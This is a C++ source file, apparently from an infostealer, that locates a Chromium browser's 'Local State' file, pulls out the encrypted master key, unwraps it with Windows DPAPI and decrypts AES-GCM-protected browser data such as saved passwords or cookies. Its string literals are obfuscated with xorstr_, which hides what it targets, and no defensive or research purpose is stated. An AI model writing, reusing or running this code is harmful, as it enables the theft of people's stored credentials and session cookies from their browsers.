//
// Created by .1qxz on 08.06.2024.
//

#include "ChromiumUtil.h"

std::vector<BYTE> ChromiumUtil::getMasterKey(const fs::path &path) {
    if(!exists(path))
        return {};

    std::string masterKey;
    try
    {
        fs::path localStatePath = path / xorstr_("Local State");

        if(!exists(localStatePath))
            return {};

        std::string content = Utils::readFile(localStatePath);
        if(content.empty())
            return {};

        json jsonObject = json::parse(content);
        masterKey = jsonObject[xorstr_("os_crypt")][xorstr_("encrypted_key")];
    }
    catch (const std::exception& e)
    {
        return {};
    }

    std::vector<BYTE> decoded_key = Base64Util::b64decode(masterKey);
    decoded_key.erase(decoded_key.begin(), decoded_key.begin() + 5);

    return decoded_key;
}

std::string ChromiumUtil::decryptData(const std::vector<BYTE> &buffer, const std::vector<BYTE> &master_key) {
    auto decrypted_key = ChromiumUtil::CryptUnprotectDataWrapper(master_key);
    std::vector<unsigned char> iv(buffer.begin() + 3, buffer.begin() + 15);
    std::vector<unsigned char> ciphertext(buffer.begin() + 15, buffer.end() - 16);

    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCRYPT_KEY_HANDLE hKey = nullptr;
    NTSTATUS status;

    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0);
    if (status != 0) return "";

    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    if (status != 0) return "";

    status = BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0, decrypted_key.data(), static_cast<ULONG>(decrypted_key.size()), 0);
    if (status != 0) return "";

    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce = iv.data();
    authInfo.cbNonce = static_cast<ULONG>(iv.size());
    authInfo.pbTag = const_cast<BYTE*>(buffer.data() + buffer.size() - 16);
    authInfo.cbTag = 16;

    std::vector<unsigned char> decrypted(ciphertext.size());
    ULONG decryptedSize = 0;

    status = BCryptDecrypt(hKey, ciphertext.data(), static_cast<ULONG>(ciphertext.size()), &authInfo, nullptr, 0, decrypted.data(), static_cast<ULONG>(decrypted.size()), &decryptedSize, 0);
    if (status != 0) return "";

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    return std::string(decrypted.begin(), decrypted.begin() + decryptedSize);
}

std::vector<BYTE> ChromiumUtil::CryptUnprotectDataWrapper(const std::vector<BYTE> &data) {
    DATA_BLOB inData, outData;
    inData.pbData = const_cast<BYTE*>(data.data());
    inData.cbData = static_cast<DWORD>(data.size());

    if (CryptUnprotectData(&inData, NULL, NULL, NULL, NULL, 0, &outData)) {
        std::vector<unsigned char> result(outData.pbData, outData.pbData + outData.cbData);
        LocalFree(outData.pbData);
        return result;
    } else {
        return {};
    }
}
